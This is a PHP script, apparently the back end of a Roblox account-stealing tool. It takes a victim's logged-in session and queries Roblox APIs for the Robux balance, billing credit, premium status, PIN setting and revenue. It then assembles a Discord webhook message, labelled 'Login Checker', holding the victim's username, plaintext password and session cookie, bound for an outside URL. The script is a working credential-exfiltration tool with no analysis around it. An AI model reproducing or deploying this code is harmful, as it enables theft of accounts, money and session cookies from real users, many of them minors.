<?php
$robux = json_decode($session->get('http://api.roblox.com/currency/balance')->body)->robux;
$friends = json_decode($session->get('http://api.roblox.com/user/get-friendship-count')->body)->count;
$userid = json_decode($session->get('https://users.roblox.com/v1/users/authenticated')->body)->id;
$credit = json_decode($session->get('https://billing.roblox.com/v1/credit')->body)->balance;
$premium = $session->get('https://premiumfeatures.roblox.com/v1/users/'.$userid.'/validate-membership')->body;
$joindate = json_decode($session->get('https://users.roblox.com/v1/users/'.$userid)->body)->created;
$pin = json_decode($session->get('https://auth.roblox.com/v1/account/pin')->body)->isEnabled;
$verified = $session->get("https://api.roblox.com/ownership/hasasset?userId=".$userid."&assetId=102611803")->body;
$revenue = json_decode($session->get("https://economy.roblox.com/v1/users/".$userid."/revenue/summary/Year")->body);
$totalrobux = $revenue->PremiumPayouts+$revenue->groupPremiumPayouts+$revenue->recurringRobuxStipend+$revenue->itemSaleRobux+$revenue->purchasedRobux+$revenue->tradeSystemRobux+$revenue->pendingRobux+$revenue->groupPayoutRobux;
if ($pin) {
    $pin = "True";
} else {
    $pin = "False";
};
$embed = '{
  "embeds": [
    {
      "title": "Login Checker",
      "color": 65290,
      "fields": [
        {
          "name": "Username",
          "value": "'.$username.'",
          "inline": true
        },
        {
          "name": "Password",
          "value": "'.$password.'",
          "inline": true
        },
        {
          "name": "Premium",
          "value": "'.$premium.'",
          "inline": true
        },
        {
          "name": "Profile",
          "value": "[Click Here](https://web.roblox.com/users/'.$userid.'/profile)",
          "inline": true
        },
        {
          "name": "Robux",
          "value": "'.$robux.'",
          "inline": true
        },
        {
          "name": "Credit",
          "value": "$'.$credit.'",
          "inline": true
        },
        {
          "name": "Friends",
          "value": "'.$friends.'",
          "inline": true
        },
        {
          "name": "Creation Date",
          "value": "'.$joindate.'",
          "inline": true
        },
        {
          "name": "Pin",
          "value": "'.$pin.'",
          "inline": true
        },
        {
          "name": "Verified",
          "value": "'.$verified.'",
          "inline": true
        },
        {
          "name": "Account Revenue",
          "value": "R$'.$totalrobux.'",
          "inline": true
        },
        {
          "name": "Cookie",
          "value": "'.$cookie.'",
          "inline": false
        }
      ],
      "thumbnail": {
        "url": "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userid='.$userid.'"
      }
    }
  ],
  "username": "LOGIN CHECKER",
  "avatar_url": "https://cdn.discordapp.com/attachments/695254344580464650/707133758867767326/IMG_20200505_153609.JPG"
}';
$discordurl = $successurl;
?>